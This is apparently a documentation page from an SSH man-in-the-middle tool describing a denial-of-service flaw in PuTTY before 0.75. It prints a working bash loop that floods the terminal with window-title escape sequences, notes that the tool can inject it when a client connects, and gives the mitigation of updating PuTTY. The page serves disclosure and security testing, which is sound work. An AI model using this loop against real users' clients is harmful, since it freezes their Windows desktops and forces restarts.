    ^^^
    PuTTY before 0.75 on Windows allows remote servers to cause a denial of service
    (Windows GUI hang) by telling the PuTTY window to change its title repeatedly at high speed,
    which results in many SetWindowTextA or SetWindowTextW calls.

    NOTE: the same attack methodology may affect some OS-level GUIs on Linux or other platforms for similar reasons.
    +++
    **Affected Software:**

    * PuTTY < 0.75


Description
-----------

A vulnerability in PuTTY < 0.75 freezes the entire, leading inevitably to a manual restart. This happens when executing
a simple command to repeatedly change the terminals title.

Set window title from terminal:

.. code-block:: bash

    $ PS1=''
    $ echo -ne "\033]0; NEW_TITLE \007"

Thus, an working exploit would be:

.. code-block:: bash

    $ PS1=''
    $ while :
    > do
    > echo -ne "\033]0; NEW_TITLE${RANDOM}  \007"
    > done


Using the injection functionality of the mitm Server, this exploit can be executed immediately when a client connects
to the server via PuTTY.


Mitigation
----------

Update PuTTY to version >= 0.75
